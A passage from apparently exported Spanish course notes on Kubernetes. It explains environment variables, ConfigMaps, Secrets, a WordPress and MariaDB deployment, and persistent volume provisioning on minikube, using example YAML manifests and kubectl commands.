nombre:\n\nEsquema\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/7.-despliegues-parametrizados/7.0-despliegue-parametrizados":{"title":"7.0-despliegue-parametrizados","links":[],"tags":[],"content":"7. Despliegues parametrizados\nEn muchas ocasiones necesitamos parametrizar nuestros despliegues, para ello podemos guardar información de distinta forma. En este módulo vamos a estudiar distintas maneras de guardar información en kubernetes, que nos permitirá posteriormente parametrizar los Deployments:\n\nVariables de entorno\nConfigMaps\nSecrets\n\nTerminaremos estudiaremos un ejemplo completo donde desplegaremos un WoordPress + MariaDB."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/7.-despliegues-parametrizados/7.1-variables-de-entorno":{"title":"7.1-variables-de-entorno","links":[],"tags":[],"content":"7.1 Variables de entorno\nPara añadir alguna configuración específica a la hora de lanzar un contenedor, se usan variables de entorno del contenedor cuyos valores se especifican al crear el contenedor para realizar una configuración concreta del mismo.\nPor ejemplo, si estudiamos la documentación de la imagen mariadb en Docker Hub, podemos comprobar que podemos definir un conjunto de variables de entorno como MYSQL_ROOT_PASSWORD, MYSQL_DATABASE, MYSQL_USER, MYSQL_PASSWORD, etc., que nos permitirán configurar de alguna forma determinada nuestro servidor de base de datos (indicando la contraseña del usuario root, creando una determinada base de datos o creando un usuario con una contraseña por ejemplo.\nDe la misma manera, al especificar los contenedores que contendrán los Pods que se van a crear desde un Deployment, también se pondrán inicializar las variables de entorno necesarias.\nConfiguración de aplicaciones usando variables de entorno\nVamos a hacer un despliegue de un servidor de base de datos mariadb. Si volvemos a estudiar la documentación de esta imagen en Docker Hub comprobamos que obligatoriamente tenemos que indicar la contraseña del usuario root inicializando la variable de entorno MYSQL_ROOT_PASSWORD. El fichero de despliegue que vamos a usar es mariadb-deployment-env.yaml, y vemos el fragmento del fichero donde se define el contenedor:\n...\n    spec:\n      containers:\n        - name: contenedor-mariadb\n          image: mariadb\n          ports:\n            - containerPort: 3306\n              name: db-port\n          env:\n            - name: MYSQL_ROOT_PASSWORD\n              value: my-password\n\nEn el apartado containers hemos incluido la sección env donde vamos indicando, como una lista, el nombre de la variable (name) y su valor (value). En este caso hemos indicado la contraseña my-password.\nVamos a comprobar si realmente se ha creado el servidor de base de datos con esa contraseña del root:\nkubectl apply -f mariadb-deploymen-env.yaml\n\nkubectl get all\n...\nNAME                                 READY   UP-TO-DATE   AVAILABLE   AGE\ndeployment.apps/mariadb-deployment   1/1     1            1           5s\n\nkubectl exec -it deployment.apps/mariadb-deployment -- mysql -u root -p\nEnter password:\n...\nMariaDB [(none)]&gt;\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/7.-despliegues-parametrizados/7.2-configmaps":{"title":"7.2-configmaps","links":[],"tags":[],"content":"7.2 ConfigMaps\nEn el apartado anterior hemos estudiado como podemos definir las variables de entorno de los contenedores que vamos a desplegar. Sin embargo, la solución que presentamos puede tener alguna limitación:\n\nLos valores de las variables de entorno están escritos directamente en el fichero yaml. Estos ficheros yaml suelen estar en repositorios git y lógicamente no es el sitio más adecuado para ubicarlos.\nPor otro lado, escribiendo los valores de las variables de entorno directamente en los ficheros, hacemos que estos ficheros no sean reutilizables en otros despliegues y que el procedimiento de cambiar las variables sea tedioso y propenso a errores, porque hay que hacerlo en varios sitios.\n\nPara solucionar estas limitaciones, podemos usar un nuevo recurso de Kubernetes llamado ConfigMap.\nConfiguración de aplicaciones usando ConfigMaps\nConfigMap permite definir un diccionario (clave,valor) para guardar información que se puede utilizar para configurar una aplicación.\nAunque hay distintas formas de indicar el conjunto de claves-valor de nuestro ConfigMap, en este caso vamos a usar literales, por ejemplo:\nkubectl create cm mariadb --from-literal=root_password=my-password \\\n                          --from-literal=mysql_usuario=usuario     \\\n                          --from-literal=mysql_password=password-user \\\n                          --from-literal=basededatos=test\n\nEn el ejemplo anteriore, hemos creado un ConfigMap llamado mariadb con cuatro pares clave-valor. Para ver los ConfigMap que tenemos creados, podemos utilizar:\nkubectl get cm\n\nY para ver los detalles del mismo:\nkubectl describe cm mariadb\n\nUna vez que creado el ConfigMap se puede crear un despliegue donde las variables de entorno se inicializan con los valores guardados en el ConfigMap. Por ejemplo, un despliegue de una base de datos lo podemos encontrar en el fichero mariadb-deployment-configmap.yaml y el fragmento donde definimos las variables de entorno quedaría:\n...\n    spec:\n      containers:\n        - name: contenedor-mariadb\n          image: mariadb\n          ports:\n            - containerPort: 3306\n              name: db-port\n          env:\n            - name: MYSQL_ROOT_PASSWORD\n              valueFrom:\n                configMapKeyRef:\n                  name: mariadb\n                  key: root_password\n            - name: MYSQL_USER\n              valueFrom:\n                configMapKeyRef:\n                  name: mariadb\n                  key: mysql_usuario\n            - name: MYSQL_PASSWORD\n              valueFrom:\n                configMapKeyRef:\n                  name: mariadb\n                  key: mysql_password\n            - name: MYSQL_DATABASE\n              valueFrom:\n                configMapKeyRef:\n                  name: mariadb\n                  key: basededatos\n\nObservamos como al indicar las variables de entorno (sección env) seguimos indicado el nombre (name) pero el valor se indica con una clave de un ConfigMap (valueFrom: - configMapKeyRef:), para ello se indica el nombre del ConfigMap (name) y el valor que tiene una determinada clave (key). De esta manera, no guardamos en los ficheros yaml los valores específicos de las variables de entorno, y además, estos valores se pueden reutilizar para otros despliegues, por ejemplo, al desplegar un CMS indicar los mismos valores para las credenciales de acceso a la base de datos."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/7.-despliegues-parametrizados/7.3-secrets":{"title":"7.3-secrets","links":[],"tags":[],"content":"7.3 Secrets\nCuando en un variable de entorno indicamos una información sensible, como por ejemplo, una contraseña o una clave ssh, es mejor utilizar un nuevo recurso de Kubernetes llamado Secret.\nLos Secrets permiten guardar información sensible que será codificada o cifrada.\nHay distintos tipos de Secret, en este curso vamos a usar los genéricos y los vamos a crear a partir de un literal. Por ejemplo para guardar la contraseña del usuario root de una base de datos, crearíamos un Secret de la siguiente manera:\nkubectl create secret generic mariadb --from-literal=password=my-password\n\nPodemos obtener información de los Secret que hemos creado con las instrucciones:\nkubectl get secret\nkubectl describe secret mariadb\n\nVeamos a continuación cómo quedaría un despliegue que usa el valor de un Secret para inicializar una variable de entorno. Vamos a usar el fichero mariadb-deployment-secret.yaml y el fragmento donde definimos las variables de entorno quedaría:\n...\n    spec:\n      containers:\n        - name: mariadb\n          image: mariadb\n          ports:\n            - containerPort: 3306\n              name: db-port\n          env:\n            - name: MYSQL_ROOT_PASSWORD\n              valueFrom:\n                secretKeyRef:\n                  name: mariadb\n                  key: password\n\nObservamos como al indicar las variables de entorno (sección env) seguimos indicado el nombre (name) pero el valor se indica con un valor de un Secret (valueFrom: - secretKeyRef:), indicando el nombre del Secret (name) y la clave correspondiente. (key)."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/7.-despliegues-parametrizados/7.4-ejemplo-completo-despliegue-y-acceso-a-wordpress-+-mariadb":{"title":"7.4-ejemplo-completo-despliegue-y-acceso-a-wordpress-+-mariadb","links":[],"tags":[],"content":"7.4 Ejemplo completo: Despliegue y acceso a Wordpress + MariaDB\nEn este ejemplo vamos a desplegar el CMS Wordpress y la base de datos MariaDB para su correcto funcionamiento. Cada uno de los servicios se van a desplegar independientemente, y configuraremos los Services para acceder desde el exterior a la aplicación y para que el Wordpress pueda acceder a la base de datos:\nConfiguración de los contenedores\n\nComo hemos estudiado en los ejemplos vistos en este módulo, al crear el despliegue de MariaDB tendremos que configurar las siguientes variables de entorno: MYSQL_ROOT_PASSWORD (contraseña del usuario root de la base de datos), MYSQL_DATABASE (el nombre de la base de datos que se va a crear), MYSQL_USER (nombre del usuario de la base de datos que se va carear), MYSQL_PASSWORD (contraseña de este usuario).\nSi comprobamos la documentación de la imagen Wordpress en Docker Hub las variables de entorno que vamos a definir son las siguientes: WORDPRESS_DB_HOST (la dirección del servidor de base de datos), WORDPRESS_DB_USER (el usuario que se va a usar para acceder a la base de datos), WORDPRESS_DB_PASSWORD (la contraseña de dicho usuario) y WORDPRESS_DB_NAME (el nombre de la base de datos a las que vamos a conectar para gestionar las tablas de Wordpress).\n\nEvidentemente los valores de estas variables tienen que coincidir, es decir, el usuario y la contraseña que creemos en la base de datos serán las mismas que utilicemos desde Wordpress para acceder a la base de datos, y el nombre de la base de datos usada por WordPres será el mismo que la base de datos creada en MariaDB.\nLo veremos posteriormente, pero adelantamos, que el valor de la variable WORDPRESS_DB_HOST será el nombre del Service que creemos para acceder a la base de datos, como ya hemos estudiado, se creará un registro en el DNS del cluster que permitirá que Wordpress acceda a la base de datos usando el nombre del Service.\nLos valores para crear la base de datos y el usuario en MariaDB, que corresponden a las credenciales que vamos a usar en Wordpress, los vamos a guardar en dos recursos de nuestro cluster: los datos no sensibles (nombre de usuario y nombre de la base de datos) lo guardaremos en un ConfigMap y los datos sensibles, las contraseñas, la guardaremos en un Secret.\nPara ello ejecutamos las siguientes instrucciones:\nkubectl create cm bd-datos --from-literal=bd_user=user_wordpress \\\n                           --from-literal=bd_dbname=wordpress\n\nkubectl create secret generic bd-passwords --from-literal=bd_password=password1234 \\\n                                           --from-literal=bd_rootpassword=root1234\n\nNota: No hemos guardado la definición del ConfigMap y el Secret en un fichero yaml. De esta manera evitamos que información sensible sea guardada por ejemplo en un repositorio git.\nSin embargo, a partir de las instrucciones anteriores podemos generar ficheros yaml que posteriormente añadimos a la configuración del cluster. Podemos ejecutar:\nkubectl create cm bd-datos --from-literal=bd_user=user_wordpress \\\n                           --from-literal=bd_dbname=wordpress \\\n                           -o yaml --dry-run=client &gt; bd_datos_configmap.yaml\n\nkubectl create secret generic bd-passwords --from-literal=bd_password=password1234 \\\n                                           --from-literal=bd_rootpassword=root1234 \\\n                                           -o yaml --dry-run=client &gt; bd_passwords_secret.yaml\n\nCon la opción --dry-run=client, kubectl va a simular la creación del recurso, pero no se llega a ejecutar, sin embargo con la opción -o yaml generamos el fichero yaml con la definición del recurso. Posteriormente sólamente tendremos que ejecutar las siguientes instrucciones para crear los dos recursos:\nkubectl apply -f bd_datos_configmap.yaml\nkubectl apply -f bd_passwords_secret.yaml\n\nDespliegue de la base de datos\nPara desplegar la base de datos vamos a usar el fichero mariadb-deployment.yaml. Podemos observar en el fichero cómo los datos de las variables de entorno del contenedor se inicalizan con los valores que hemos creado en el ConfigMap y en el Secret anterior. Ejecutamos:\nkubectl apply -f mariadb-deployment.yaml\n\nLa definición del Service que vamos a crear lo tenemos en el fichero: mariadb-srv.yaml. Como comprobamos en la definición estamos creando un Service del tipo ClusterIP, ya que no vamos a acceder a la base de datos desde el exterior. Además es importante recordar el nombre que hemos puesto al Service (mariadb-service), ya que cómo hemos indicado posteriormente, usaremos este nombre para configurar la aplicación Wordpress a la hora de indicar el servidor de base de datos. Ejecutamos:\nkubectl apply -f mariadb-srv.yaml\n\nDespliegue de la aplicación Wordpress\nPara desplegar la aplicación Wordpress vamos a usar el fichero wordpress-deployment.yaml. Podemos observar en el fichero cómo los datos de las variables de entorno del contenedor se inicializan con los valores que hemos creado en el ConfigMap y en el Secret anterior. Además, comprobamos que la variable de entorno WORDPRESS_DB_HOST se inicializa a mariadb-service, que es el nombre del Service creado para a acceder a mariaDB. Ejecutamos:\nkubectl apply -f wordpress-deployment.yaml\n\nLa definición del Service que vamos a crear la tenemos en el fichero: wordpress-srv.yaml. Como comprobamos en la definición estamos creando un Service del tipo NodePort, pero también podríamos haberlo configurado de tipo ClusterIP, porque posteriormente vamos a crear un recurso Ingress para acceder a la aplicación. Ejecutamos:\nkubectl apply -f wordpress-srv.yaml\n\nAcceso a la aplicación\nPara acceder a la aplicación vamos a crear un recurso Ingress que tenemos definido en el fichero: wordpress-ingress.yaml. Como podemos observar vamos a usar el nombre www.miwordpress.org que tendremos que añadir en la resolución estática del ordenador desde el que vamos a acceder. También es interesante observar a que Service se va acceder con este recurso Ingress, el nombre del Service es wordpress-service que evidentemente es el mismo que hemos puesto en la definición del Service de Wordpress.\nUna vez que comprobemos que todos los recursos están funcionando, podemos acceder a nuestra aplicación:\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/8.0-almacenamiento-en-kubernetes":{"title":"8.0-almacenamiento-en-kubernetes","links":[],"tags":[],"content":"8. Almacenamiento en Kubernetes\nYa lo hemos comentando en anteriores módulos, pero es importante tener en cuenta que los Pods son efímeros, es decir, cuando un Pod se elimina se pierde toda la información que tenía. Evidentemente, cuando creamos un nuevo Pod no contendrá ninguna información adicional a la propia aplicación.\nPodemos fijarnos en el Ejemplo: Despliegue y acceso a Wordpress + MariaDB (que vestudiamos en el módulo anterior), y responder las siguientes preguntas:\n\n\n¿Qué pasa si eliminamos el despliegue de mariadb?, o, ¿se elimina el Pod de mariadb y se crea uno nuevo?\nEvidentemente, toda la información guardada en la base de datos se perderá, por lo que al iniciar un nuevo despliegue, no tendremos información guardada, habremos perdido todo el contenido de nuestra aplicación y empezaría de nuevo el proceso de instalación.\n\n\n¿Qué pasa si escalamos el despliegue de la base de datos y tenemos dos Pods ofreciendo la base de datos?\nEn este caso el Pod más antiguo tendría la información de la base de datos, pero el nuevo Pod creado al escalar el despliegue no tendría ninguna información. Como al acceder al Service de la base de datos se hace balanceo de carga, en unas ocasiones accederíamos al Pod antiguo, y todo funcionaría correctamente, pero cuando accederíamos al Pod nuevo, al no tener información, nos mostraría la pantalla de instalación de la aplicación. En definitiva, tendríamos dos bases de datos distintas a las que accederíamos indistintamente.\n\n\nSi escribimos un post en el Wordpress y subimos una imagen, ¿qué pasa con esta información en el Pod?\nEstá claro que cuando escribimos un post esa información se guarda en la base de datos. Pero la imagen que hemos subido al post se guardaría en un directorio del servidor web (del Pod de Wordpress). Tendríamos los mismos problemas que con la base de datos, si eliminamos este Pod se perderá todo el contenido estático de nuestro Wordpress.\n\n\n¿Qué pasa si escalamos el despliegue de Wordpress a dos Pods?\nPues la respuesta es similar a la anterior. En este caso, el Pod antiguo tendría almacenada el contenido estático (la imagen), pero el nuevo no tendría esa información. Como al acceder a la aplicación se balancea la carga, se mostraría la imagen diferente en función del Pod que estuviéramos accediendo.\n\n\nPor lo tanto, es necesario usar un mecanismo que nos permita guardar la información con la que trabajan los Pods para que no se pierda en caso de que el Pod se elimine. Al sistema de almacenamiento persistente que nos ofrece Kubernetes lo llamamos volúmenes. Con el uso de dichos volúmenes vamos a conseguir varias cosas:\n\nSi un Pod guarda su información en un volumen, está no se perderá. Por lo que podemos eliminar el Pod sin ningún problema y cuando volvamos a crearlo mantendrá la misma información. En definitiva, los volúmenes proporcionan almacenamiento adicional o secundario al disco que define la imagen.\nSi usamos volúmenes, y tenemos varios Pods que están ofreciendo un servicio, estos Pods tendrán la información compartida y por tanto todos podrán leer y escribir la misma información.\nTambién podemos usar los volúmenes dentro de un Pod, para que los contenedores que forman parte de él puedan compartir información.\n\nPor último, indicar que vamos a tener a nuestra disposición distintos tipos de volúmenes para usar. Hay que tener en cuenta que si nuestro cluster tiene varios nodos y los Pods de una aplicación se reparten por estos nodos, necesitamos sistemas de almacenamiento que nos posibiliten compartir la información entre los nodos del cluster. Como en este curso estamos usando minikube, nuestro cluster tiene un solo nodo, por lo que vamos a usar un tipo de almacenamiento que permita compartir la información dentro de este nodo (por ejemplo un directorio en el sistema de archivos del nodo), por lo tanto este tema lo vamos a simplificar al no tener la posibilidad de tener un cluster con varios nodos."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/8.1-volumenes-en-kubernetes":{"title":"8.1-volumenes-en-kubernetes","links":[],"tags":[],"content":"8.1 Volúmenes en Kubernetes\nTipos de volúmenes\nLos volúmenes nos permiten proporcional almacenamiento a los Pods, y podemos usar distintos tipos que nos ofrecen distintas características:\n\nProporcionados por proveedores de cloud: AWS, Azure, GCE, OpenStack, etc\nPropios de Kubernetes:\n\nconfigMap: Para usar un configMap como un directorio desde el Pod.\nemptyDir: Volumen efímero con la misma vida que el Pod. Usado como almacenamiento secundario o para compartir entre contenedores del mismo Pod.\nhostPath: Monta un directorio del host en el Pod (usado excepcionalmente, pero es el que nosotros vamos a usar con minikube).\n…\n\n\nHabituales en despliegues “on premises”: glusterfs, cephfs, iscsi, nfs, etc.\n\nTrabajando con volúmenes\nAl trabajar con volúmenes en Kubernetes se realizan dos funciones claramente diferenciadas:\n\n\nDesde el punto de vista del administrador del cluster de Kubernetes:\nEl administrador es el responsable de la gestión del almacenamiento en el clúster de k8s. Proporciona almacenamiento a las aplicaciones, entrando a detalle en configurar los diferentes mecanismo, bien proporcionados por el proveedor de cloud o configurados directamente. Para ello gestiona los recursos del cluster llamados PersistentVolume o StorageClasses. Ejemplos:\n\nConfigurar Azure Disk para que pueda usarlo k8s.\nConfigurar Cephfs o RBD en la red local para usarlo en k8s.\n\n\n\nDesde el punto de vista del desarrollador de aplicaciones que van a ser ejecutadas en el cluster de Kubernetes:\nA los desarrolladores de aplicaciones les interesa más la disponibilidad y las características del almacenamiento que los detalles sobre el mecanismo de almacenamiento. Para solicitar almacenamiento se va a utilizar el recurso del cluster PersistentVolumeClaim. Ejemplos:\n\nQuiero 20 GiB de almacenamiento permanente que pueda compartir entre varios Pods de varios nodos en modo lectura.\nQuiero 10 GiB de almacenamiento provisional para usar desde un Pod en modo lectura y escritura.\n\n\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/8.2-aprovisionamiento-de-volumenes":{"title":"8.2-aprovisionamiento-de-volumenes","links":[],"tags":[],"content":"8.2 Aprovisionamiento de volúmenes\nPara que el administrador de Kubernetes defina los volúmenes disponibles en nuestro cluster tenemos dos posibilidades:\n\nAprovisionamiento estático\nEn este caso, es el administrador del cluster el responsable de ir definiendo los distintos volúmenes disponibles en el cluster creando manualmente los distintos recursos PersistentVolumen (PV).\nUn PersistentVolumen es un objeto que representa los volúmenes disponibles en el cluster. En él se van a definir los detalles del backend de almacenamiento que vamos a utilizar, el tamaño disponible, los modos de acceso, las políticas de reciclaje, etc.\nTenemos tres modos de acceso, que dependen del backend que vamos a utilizar:\n\nReadWriteOnce: read-write solo para un nodo (RWO)\nReadOnlyMany: read-only para muchos nodos (ROX)\nReadWriteMany: read-write para muchos nodos (RWX)\n\nLas políticas de reciclaje de volúmenes también dependen del backend y son:\n\nRetain: El PV no se elimina, aunque el PVC se elimine. El administrador debe borrar el contenido para la próxima asociación.\nRecycle: Reutilizar contenido. Se elimina el contenido y el volumen es de nuevo utilizable.\nDelete: Se borra después de su utilización.\n\nA modo de resumen, ponemos en la siguiente tabla los modos de acceso de algunos de los sistemas de almacenamiento más usados:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nPluginReadWriteOnceReadOnlyManyReadWriteManyAWS EBS✓--AzureFile✓✓✓AzureDisk✓--CephFS✓✓✓Cinder✓--GCEPersistentDisk✓✓-Glusterfs✓✓✓HostPath✓--iSCSI✓✓-NFS✓✓✓RBD✓✓-\nPor último, vemos un ejemplo de un fichero yaml que nos permite la definición de un PersitentVolumen:\napiVersion: v1\nkind: PersistentVolume\nmetadata:\n  name: pv1\nspec:\n  storageClassName: manual\n  capacity:\n    storage: 5Gi\n  accessModes:\n    - ReadWriteOnce\n  persistentVolumeReclaimPolicy: Recycle\n  hostPath:\n    path: /data/pv1\n\n\nstorageClassName: manual: Indica que este volumen se puede asignar de forma estática, sin utilizar ningún “aprovisonador” de almacenamiento.\nSe indica al tamaño del volumen, con capacity, storage.\naccessModes: El modo de acceso.\npersistentVolumeReclaimPolicy: La política de reciclaje.\nY por útimo se indica el tipo (backend) de almacenamiento, en este caso es de tipo hostPath que creará un directorio (/data/pv1) en el nodo para guardar la información.\n\nAprovisionamiento dinámico\nCuando el desarrollador necesita almacenamiento para su aplicación, hace una petición de almacenamiento creando un recurso PersistentVolumenClaim (PVC) y de forma dinámica se crea el recurso PersistentVolume que representa el volumen y se asocia con esa petición. De otra forma explicado, cada vez que se cree un PersistentVolumenClaim, se creará bajo demanda un PersistentVolumen que se ajuste a las características seleccionadas.\nPara conseguir la gestión dinámica de volúmenes, necesitamos un “aprovisionador” de almacenamiento (tendremos distintos aprovisionadores para los distintos tipos de almacenamiento).\nPara definir los “aprovisionadores” de almacenamiento, usaremos el objeto StorageClass. En Minikube, por defecto, ya tenemos un provisionador para almacenamiento del tipo hostPath (monta un directorio del host en el pod).\nkubectl get storageclass\nNAME                 PROVISIONER                RECLAIMPOLICY   VOLUMEBINDINGMODE   ALLOWVOLUMEEXPANSION   AGE\nstandard (default)   k8s.io/minikube-hostpath   Delete          Immediate           false                  46d\n\nEn este caso la configuración del objeto storageclass se definió con las siguientes características:\n\nLa política de reciclaje tiene el valor Delete.\nY el modo de asociación (VOLUMEBINDINGMODE) tiene el valor Immediate, es decir, cuando se cree el objeto PersistenVolumenClaim se asociará de forma dinámica un volumen (objeto PersistenVolumen) inmediatamente. Otro valor podría ser WaitForFirstConsumer, en ese caso la asociación se haría cuando se utilizará el volumen.\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/8.3-solicitud-de-volumenes":{"title":"8.3-solicitud-de-volumenes","links":[],"tags":[],"content":"8.3 Solicitud de volúmenes\nIndependientemente de cómo haya aprovisionado el almacenamiento el administrador del cluster (de forma dinámica o de forma estática), el desarrollador debe hacer una solicitud de almacenamiento, indicando las características del volumen que necesita.\nUn desarrollador no necesita conocer los distintos tipos de volúmenes disponibles en el cluster. ¡Son detalles muy específicos!\nUn desarrollador se centra en indicar los requerimientos que debe tener el volumen que necesita:\n\nTamaño.\nTipo de acceso (sólo lectura o lectura / escritura).\nTipo de volumen (sólo si es importante).\n\nPara hacer la solicitud de un volumen, el desarrollador debe crear un recurso en el cluster llamado PersitentVolumenClaim, veamos un ejemplo:\napiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n    name: pvc1\nspec:\n  storageClassName: manual\n  accessModes:\n    - ReadWriteOnce\n  resources:\n    requests:\n      storage: 1Gi\n\nEn esta solicitud el desarrollador indica los requisitos que necesita para su almacenamiento:\n\nstorageClassName: manual: Con esto indicamos que no se use ningún aprovisionador dinámico. Si no pongo esta línea se intentaran asociar un volumen de forma dinámica.\naccessModes: El tipo de acceso que necesita.\nY el tamaño que necesita en resources, requests, storage.\n\nUna vez que se crea este recurso, el cluster intentará asignar un volumen (ya sea de forma estática o dinámica) que cumpla con los requisitos indicados."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/8.4-uso-de-volumenes":{"title":"8.4-uso-de-volumenes","links":[],"tags":[],"content":"8.4 Uso de volúmenes\nUna vez que hemos solicitado el almacenamiento, y se ha asignado un volumen (ya sea de forma dinámica o estática), vamos a definir el uso que se va a hacer de este volumen.\nComo ejemplo, vamos a definir un Pod que utilice dicho volumen, para ello vamos a crear un fichero yaml con la siguiente definición:\nkind: Pod\napiVersion: v1\nmetadata:\n  name: task-pv-pod\nspec:\n  volumes:\n    - name: task-pv-storage\n      persistentVolumeClaim:\n       claimName: pvc1\n  containers:\n    - name: task-pv-container\n      image: nginx\n      ports:\n        - containerPort: 80\n          name: &quot;http-server&quot;\n      volumeMounts:\n        - mountPath: &quot;/usr/share/nginx/html&quot;\n          name: task-pv-storage\n\n\nEn la especificación de este Pod, además de indicar el contenedor, hemos indicado que va a tener un volumen (campo volumes).\nEn realidad definimos una lista de volúmenes (en este caso solo definimos uno) indicando su nombre (name) y la solicitud del volumen (persistentVolumeClaim, claimName).\nAdemás en la definición del contenedor tendremos que indicar el punto de montaje del volumen (volumeMounts) señalando el directorio del contenedor (mountPath) y el nombre (name).\n\nCuando el Pod termina, el pvc mantiene el volumen reservado (bound). Es necesario que se borre explícitamente el pvc para liberarlo.\nLa recuperación del volumen dependerá de la política de reciclaje que tuviera asignada."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/8.-almacenamiento-en-kubernetes/ejemplo-1-gestion-estatica-de-volumenes":{"title":"ejemplo-1-gestion-estatica-de-volumenes","links":[],"tags":[],"content":"Ejemplo 1: Gestión estática de volúmenes\nOcultar\nEn este ejemplo vamos a desplegar un servidor web que va a servir una página html que tendrá almacenada en un volumen. En este primer ejemplo, la asignación del volumen se va a realizar de forma estática.\nAprovisonamiento del volumen\nEn este caso, será el administrador del cluster el responsable de dar de alta en el cluster los volúmenes disponibles. Como hemos estudiado anteriormente, indicaremos algunas características del volumen: la capacidad, el modo de acceso, la política de reciclaje, el tipo de volumen,…\nPara ello vamos a describir el objeto PersistentVolume en el fichero pv-ejemplo1.yaml:\napiVersion: v1\nkind: PersistentVolume\nmetadata:\n  name: pv-ejemplo1\nspec:\n  storageClassName: manual\n  capacity:\n    storage: 5Gi\n  accessModes:\n    - ReadWriteOnce\n  persistentVolumeReclaimPolicy: Recycle\n  hostPath:\n    path: /data/pv-ejemplo1\n\nNota\nOcultar\nNota: como estamos utilizando minikube, y nuestro cluster está formado por un sólo nodo, el tipo de almacenamiento más simple que podemos usar es hostPath, que creará un directorio en el nodo (/data/pv-ejemplo1) que será el que se monte en el Pod para guardar la información.\nOcultar\nEl administrador crea el volumen:\nkubectl apply -f pv-ejemplo1.yaml\n\nPodemos ver los volúmenes que tenemos disponibles en el cluster:\nkubectl get pv\nNAME                           CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS      CLAIM   STORAGECLASS   REASON   AGE\npersistentvolume/pv-ejemplo1   5Gi        RWX            Recycle          Available           manual                  73s\n\nNos fijamos que el estado del volumen es Available, todavía no se ha asociado con ninguna solicitud de volumen.\nY podemos obtener los detalle de este recurso:\nkubectl describe pv pv-ejemplo1\n\nSolicitud del volumen\nA continuación, nosotros como desarrolladores necesitamos solicitar un volumen con ciertas características para nuestra aplicación, para ello vamos a definir un objeto PersistentVolumeClaim, que definiremos en el fichero pvc-ejemplo1.yaml:\napiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n    name: pvc-ejemplo1\nspec:\n  storageClassName: manual\n  accessModes:\n    - ReadWriteOnce\n  resources:\n    requests:\n      storage: 1Gi\n\nComo vemos, desde el punto de vista del desarrollador no se necesita saber los tipos de volúmenes que tenemos disponibles, simplemente indicamos que queremos un 1Gb de almacenamiento, el tipo de acceso y que se haga la asignación de forma estática (storageClassName: manual).\nCuando creemos el objeto PersistentVolumeClaim podremos comprobar si hay algún volumen (PersistentVolume) disponible en el cluster que cumpla con los requisitos:\nkubectl apply -f pvc-ejemplo1.yaml\n\nkubectl get pv,pvc\nNAME                           CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS   CLAIM                  STORAGECLASS   REASON   AGE\npersistentvolume/pv-ejemplo1   5Gi        RWX            Recycle          Bound    default/pvc-ejemplo1   manual                  2m1s\n\nNAME                                 STATUS   VOLUME        CAPACITY   ACCESS MODES   STORAGECLASS   AGE\npersistentvolumeclaim/pvc-ejemplo1   Bound    pv-ejemplo1   5Gi        RWX            manual         3s\n\nPodemos apreciar que el el estado del volumen ha cambiado a Bound que significa que ya está asociado al PersistentVolumeClaim que hemos creado.\nNota\nOcultar\nNota: El desarrollador quería 1 Gb de disco, demanda que se cumple de sobra con los 5 Gb del volumen que se ha asociado.\nOcultar\nUso del volumen\nUna vez que tenemos un volumen a nuestra disposición, vamos a crear un despliegue de un servidor web, indicando en la especificación del Pod, que estará formado por el volumen y el directorio donde vamos a montarlo. Para ello vamos a usar el fichero deploy-ejemplo1.yaml:\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-ejemplo1\n  labels:\n    app: nginx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      volumes:\n        - name: volumen-ejemplo1\n          persistentVolumeClaim:\n            claimName: pvc-ejemplo1\n      containers:\n        - name: contenedor-nginx\n          image: nginx\n          ports:\n            - name: http-server\n              containerPort: 80\n          volumeMounts:\n            - mountPath: &quot;/usr/share/nginx/html&quot;\n              name: volumen-ejemplo1\n\nPodemos observar que en la especificación del Pod hemos indicado que estará formado por un volumen correspondiente al asignado al PersistentVolumeClaim pvc-ejemplo1 y que el contenedor tendrá en el volumen un punto de montaje en el directorio DocumentRoot de nginx (/usr/share/nginx/html) .\nCreamos el Deployment:\nkubectl apply -f deploy-ejemplo1.yaml\n\nY a continuación, cuando el contenedor esté funcionando:\nkubectl get all\n...\nNAME                                  READY   STATUS    RESTARTS   AGE\npod/nginx-ejemplo1-86864d84b5-s62dq   1/1     Running   0          6s\n...\n\nVamos a ejecutar un comando en el Pod para que se cree un fichero index.html en el directorio /usr/share/nginx/html (evidentemente estaremos guardando ese fichero en el volumen).\nkubectl exec pod/nginx-ejemplo1-86864d84b5-s62dq -- bash -c &quot;echo &#039;&lt;h1&gt;Almacenamiento en K8S&lt;/h1&gt;&#039; &gt; /usr/share/nginx/html/index.html&quot;\n\nFinalmente creamos el Service de acceso al despliegue, usando el fichero srv-ejemplo1.yaml.\nkubectl apply -f srv-ejemplo1.yaml\n\nkubectl get all\n...\nservice/nginx-ejemplo1   NodePort    10.106.238.146   &lt;none&gt;        80:32581/TCP   13s\n...\n\nY accedemos a la aplicación, accediendo a la ip del nodo controlador del cluster y al puerto asignado al Service NodePort:\nminikube ip\n192.168.39.222\n\nImagen de elaboración propia (CC BY-NC-SA)\n\nComprobemos la persistencia de la información\nEn primer lugar podemos acceder al nodo del cluster y comprobar que en el directorio que indicamos en la creación del volumen, efectivamente existe el fichero index.html:\nminikube ssh\nls /data/pv-ejemplo1\nindex.html\n\nEn segundo lugar podemos hacer la prueba de eliminar el despliegue, volver a crearlo y volver 